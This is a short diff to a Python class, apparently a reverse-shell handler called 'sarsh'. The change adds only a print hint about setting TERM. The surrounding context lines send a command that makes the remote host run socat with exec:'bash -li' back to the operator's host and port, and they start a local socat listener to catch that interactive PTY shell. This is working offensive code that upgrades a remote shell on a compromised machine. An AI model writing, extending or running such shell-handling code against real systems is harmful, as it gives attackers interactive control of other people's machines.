@@ -56,6 +56,7 @@ class sarsh:
             socat_port = randint(63000, 65000)
             client_socket.send(f"sleep 3; /tmp/{filename} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.lhost}:{socat_port}\n".encode())
             print("Waiting for connection...")
+            print("To set term variable: $ export TERM=xterm")
             subprocess.run(f'./socat -v file:`tty`,raw,echo=0 TCP-L:{socat_port}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
         except Exception as e:
